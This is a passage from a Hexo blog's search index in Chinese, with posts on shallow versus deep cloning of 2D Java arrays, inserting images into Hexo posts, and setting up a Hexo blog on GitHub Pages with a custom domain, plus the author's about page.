2<br></code></pre></td></tr></table></figure><p>可以发现,对a的拷贝b进行修改后，原数组a的值也被修改了。这是为什么呢？</p><p>首先我们知道，虽然数组的声明方式与其他对象有所不同，但它也是new出来的。在Java中，数组是一个对象。</p><p>查看官方文档，在Object的Clone()方法的描述中有这么两段话:</p><blockquote><p>By convention, the object returned by this method should be independent of this object (which is being cloned). To achieve this independence, it may be necessary to modify one or more fields of the object returned by super.clone before returning it. Typically, this means copying any mutable objects that comprise the internal “deep structure” of the object being cloned and replacing the references to these objects with references to the copies. If a class contains only primitive fields or references to immutable objects, then it is usually the case that no fields in the object returned by super.clone need to be modified.<br>一般来说，我们希望cloen()方法返回的对象相是独立于被克隆对象的，所以我们在返回clone方法前，应该对克隆出的对象的域进行一些修改。这通常意味着，复制被克隆对象所包含的所有内部深层结构的可变对象，并且将域中的引用，指向这些复制出的对象。如果一个类只包含基础类型或者指向不可变对象的引用，那么将不用修改Super.clone()的返回结果。</p></blockquote><p>注：不可变对象有哪些？<br>String对象都是不可变对象。<br>原始类型包装类（primitive wrappers）（Integer，Long, Short, Double, Float, Character, Byte, Boolean）也都是不可变的。<br>关键字final用于声明基本类型和对象引用为不可变对象，但是它不能使对象本身变为不可变对象。</p><p>我们再看下一段：</p><blockquote><p>The method clone for class Object performs a specific cloning operation. First, if the class of this object does not implement the interface Cloneable, then a CloneNotSupportedException is thrown. Note that all arrays are considered to implement the interface Cloneable and that the return type of the clone method of an array type T[] is T[] where T is any reference or primitive type. Otherwise, this method creates a new instance of the class of this object and initializes all its fields with exactly the contents of the corresponding fields of this object, as if by assignment; the contents of the fields are not themselves cloned. Thus, this method performs a “shallow copy” of this object, not a “deep copy” operation. Thus, this method performs a “shallow copy” of this object, not a “deep copy” operation.<br>clone()方法首先会判断一个对象是否实现了Cloneable接口，如果没有实现，则会抛出CloneNotSupportedException。而所有的数组都默认实现了Cloneable接口。如果对数组T[]进行克隆，返回结果是T[]，T是引用或者基本类型。如果对对象进行克隆，首先会新建一个这个类的实例，然后根据这个对象中域的内容来对新建的实例进行初始化（赋值操作）。因此clone（）这个方法实现了浅拷贝，并不是深拷贝。</p></blockquote><p>从以上两段话我们可以看出：<br>clone( )方法创建调用它的对象的一个复制副本。只有那些实现Cloneable接口的类能被复制。<br>如果对数组T[]进行克隆，返回结果是T[]，T是引用或者基本类型。<br>我们克隆的数组是二维数组，即数组的数组。对于clone()方法来说，这里的T[]，T是一个对数组的引用。<br>也就是说：我们克隆出来的数组的第一维度，和原来那个数组的第一维度。同时指向了同一个第二位度的数组。<br>如下图：</p><p>因此当改变数组b的时候，数组a也被改变。此时的引用关系图如下：</p><p><img src="/posts/65304/clone1.png" alt></p><p>所以，为了实现二维数组的克隆，我们需要分别对第二维度的每一个数组进行克隆。<br>实现如下：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">int b[][] &#x3D; new int[a.length][];<br>for(int i&#x3D;0;i&lt;a.length;i++)&#123;<br>b[i]&#x3D;a[i].clone();<br>&#125;<br></code></pre></td></tr></table></figure><p>将之前代码的复制部分改为以上实现，输出结果如下：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">0 0 0  1 1 1  2 2 2  <br>0 0 0  1 3 1  2 2 2<br></code></pre></td></tr></table></figure><p>可以看出使用这种方法，实现了深拷贝，两个数组相互独立，不会互相影响。<br>同样的，Java提供的Arrays.copyof()方法对于二维数组也是浅拷贝，也需要我们为数组中的每一项进行copy。<br>此时的引用关系如下图：<br><img src="/posts/65304/clone2.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Hexo文章中插入图片</title>
      <link href="/posts/37794.html"/>
      <url>/posts/37794.html</url>
      
        <content type="html"><![CDATA[<p>在写上一篇博客的时候，发现不知道该怎么往文章中插入图片，于是在网上搜。答案来来回回就那么两篇。于是就打开一个照着步骤做。</p><a id="more"></a><p>然后在操作的过程中，踩到了各种奇奇怪怪的坑。</p><p><img src="/posts/37794/pic01.jpg" alt></p><p>汪的一声就哭了<br>虽然在自己的不懈努力下</p><p>最后终于显示成功了。<br>可是，你不就一个低画质表情包吗！为什么显示这么大！！<br><img src="/posts/37794/pic02.jpg" alt><br>觉得可能是hexo主题的问题。既然这样，只能修改CSS。可是主题CSS一改，所有图片的样式都会受到影响。<br>在一番搜索过后，发现hexo可以直接使用img标签,在要添加图片的md文件所在的位置创建一个同名文件夹，把图片放在里面。然后把样式写在img标签里面。<br>すると：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;img src&#x3D;&quot;&#x2F;pic02.jpg&quot; alt&#x3D;&quot;&quot; style&#x3D;&quot;width:100px;height:100px&quot;&gt;<br></code></pre></td></tr></table></figure><img src="/posts/37794/pic02.jpg" alt style="width:100px;height:100px"><p>完美解决问题。当然，我的第一种插入图片方法只需要下面这几步。</p><ol><li><p>安装插件</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cnpm install hexo-asset-image --save<br></code></pre></td></tr></table></figure></li><li><p>在要添加图片的md文件所在的位置创建一个同名文件夹，把图片放在里面。</p></li><li><p>在md文件中使用 !(图片描述)[xxx.png]</p></li><li><p>hexo g -d 重新发布</p></li></ol><img src="/posts/37794/pic04.jpg" alt style="width:100px;height:100px;float:left;display:block"><p>如果出了意外，那就去Google吧。。</p><p> 顺便，在我不断地重新发布并查看页面的时候。明明源码已经修改过来，可是网页上显示的页面还是不变。一定是缓存的问题。于是我清空浏览器缓存，果真OK了。</p><p> 可是！每次调试都要清缓存真的好麻烦。。。<br><img src="/posts/37794/pic03.jpg" alt style="width:100px;height:100px" align="right"><br> 好在我发现了ctrl+F5 这个清缓存刷新的神奇快捷键。。。<br> 如果有遇到需要经常清缓存刷新的，这样方便多了。。<br>nice，插入图片已经不是问题了。<br>顺便,👇用这种方法可以把图片显示在文字右边，就像这样👉</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;img src&#x3D;&quot;&#x2F;pic03.jpg&quot; alt&#x3D;&quot;&quot; style&#x3D;&quot;width:100px;height:100px&quot; align&#x3D;&quot;right&quot;&gt;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用Hexo和GitHubPages搭建博客</title>
      <link href="/posts/62285.html"/>
      <url>/posts/62285.html</url>
      
        <content type="html"><![CDATA[<p>拥有自己的网站总是一件很酷的事，早就想自己写一个博客了。因为并没有深入学习前端，之前实验课模仿饿了么的商家入驻页面，一个页面写了几天才搞得差不多。虽然写前端也很吸引人，但果真我还是更喜欢写后台。最近在一个面试群里看到有人发自己的博客。用的是wordpress，听说这样很方便，于是就去搜了搜，于是就发现了HEXO。哇塞连后台都不用写了。虽然最近又有一大堆东西要复习。反正管它呢，搭了再说！</p><a id="more"></a><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>因为要用到GithubPages，所以首先在GitHub新建一个仓库，用来存放githubPages的项目文件。 GithubPages分为两种，个人页面和项目页面，个人页面每个用户只有一个,仓库名格式一定要为XXX.github.io。</p><p>下载安装node.js（安装hexo会用到）。node.js会自动将安装路径添加到环境变量。路径下有npm的命令行文件。<br>npm是包管理工具。可以从NPM服务器下载别人编写的第三方包，或者命令行。也可以上传自己编写的供别人使用。</p><p>将npm镜像更换为淘宝镜像，因为从国内访问原版镜像很慢。命令行执行：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org<br></code></pre></td></tr></table></figure><p>安装后就可以使用淘宝定制的 cnpm (gzip 压缩支持) 命令行工具代替默认的 npm</p><h3 id="安装并部署hexo"><a href="#安装并部署hexo" class="headerlink" title="安装并部署hexo"></a>安装并部署hexo</h3><p>创建一个文件夹，名为Myblog，在该文件夹路径下按shift+鼠标右键打开powershell，使用cnpm安装Hexo：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cnpm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>安装完成后，初始化博客，其中blog是项目名称（可以修改为你想要的名称）：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo init blog<br></code></pre></td></tr></table></figure><p>新建一篇文章（markdown格式）</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">cd blog<br>hexo new &quot;My First Blog&quot;<br></code></pre></td></tr></table></figure><p>会在/blog/sources/_post/目录下生成My-First-Blog.md文件。</p><p>使用Hexo引擎将md文档格式渲染为html文件，并放入博客项目之中（blog/public/年/月/日/文章名 目录下）。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo generate<br></code></pre></td></tr></table></figure><p>修改项目部署配置文件</p><p>打开项目配置文件_config.yml，最后一行是部署配置，我们打开注释中的文档网址可以看到相关配置的含义。根据文档提示修改配置文件。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">deploy:<br>    type: git<br>    repo: https:&#x2F;&#x2F;github.com&#x2F;XXXXX&#x2F;XXXXX.github.io.git   #之前创建的那个仓库的完整路径<br></code></pre></td></tr></table></figure><p>保存关闭。</p><p>安装git部署插件</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cnpm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>部署</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo clean<br>hexo g      #hexo generate的缩写<br>hexo d      #hexo deploy的缩写<br></code></pre></td></tr></table></figure><p>部署成功后就可以访问啦！<br>路径是XXX.github.io</p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>首先在你的本地项目路径/source文件夹下创建一个文件名为CNAME，在其中写入你的域名。如</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">alphabet.com<br></code></pre></td></tr></table></figure><p>然后保存.<br>在项目路径打开Powershell</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo g -d      #重新生成文件并部署<br></code></pre></td></tr></table></figure><p>在github打开该仓库的设置页面,就是如下这个页面</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">https:&#x2F;&#x2F;github.com&#x2F;xxx&#x2F;xxx.github.io&#x2F;settings<br></code></pre></td></tr></table></figure><p>找到GitHub Pages，在其中的Custom Domain中填入自己的域名。</p><p>打开cmd，ping 你的项目路径，即XXX.github.io,你会得到一个ip地址，记住这个地址。<br>然后打开你的域名管理页面，在其中添加两个解析条目</p><table><thead><tr><th align="center">主机记录</th><th align="center">记录类型</th><th align="left">记录值</th></tr></thead><tbody><tr><td align="center">@</td><td align="center">A</td><td align="left">IP地址</td></tr><tr><td align="center">www</td><td align="center">CNAME</td><td align="left">xxx.github.io</td></tr></tbody></table><p>这样就OK了，访问域名就可以访问到自己的hexo博客了。<br>可以在github选择EnforceHTTPS,这样就算是http请求，也会被转为HTTPS。根据github的提示，只需要在域名解析中添加<br>以下四个条目中至少一个就可以了</p><table><thead><tr><th align="center">主机记录</th><th align="center">记录类型</th><th align="left">记录值</th></tr></thead><tbody><tr><td align="center">@</td><td align="center">A</td><td align="left">185.199.108.153</td></tr><tr><td align="center">@</td><td align="center">A</td><td align="left">185.199.109.153</td></tr><tr><td align="center">@</td><td align="center">A</td><td align="left">185.199.110.153</td></tr><tr><td align="center">@</td><td align="center">A</td><td align="left">185.199.111.153</td></tr></tbody></table><p>至此，如果不出意外的话，就可以从域名访问到GithubPage了！</p><h3 id="主题更换"><a href="#主题更换" class="headerlink" title="主题更换"></a>主题更换</h3><p>如果觉得默认主题不好看的话，可以<a href="https://hexo.io/themes/" target="_blank" rel="noopener">在这里</a>选择自己喜欢的主题。具体的配置根据每个主题下的ReadMe来修改就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="Pyrrhax"><a href="#Pyrrhax" class="headerlink" title="Pyrrhax"></a>Pyrrhax</h2><p><strong>Be What You Wanna Be!!!</strong></p><p><strong>GitHub:<a href="https://github.com/Pyrrhax" target="_blank" rel="noopener">@Pyrrhax</a></strong><br><strong>Email:<a href>pyrrhax.hf@gmail.com</a></strong><br><strong>我的书单：<a href="https://book.douban.com/people/184374019/">https://book.douban.com/people/184374019/</a></strong><br><strong>我的知乎：<a href="https://www.zhihu.com/people/pyrrhax" target="_blank" rel="noopener">https://www.zhihu.com/people/pyrrhax</a></strong><br><strong>我的CSDN:<a href="https://blog.csdn.net/weixin_42714910" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42714910</a></strong></p><h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>0.Pyrrha是动漫《RWBY》里面的Pyrrha.</p><p>1.<em>核心游戏玩家</em>。</p><p>2.<em>图吧垃圾佬</em>。</p><p>3.<em>比较宅</em>。</p><p>5.<em>语言学习</em>。</p><p>6.<em>读书</em>。</p><p>7.怕什么真理无穷，进一寸有一寸的欢喜。</p><p>开发转渗透成功了，不过才刚刚开始。目前想多打打HTB</p>]]></content>
      
    </entry>
    
    
  
</search>
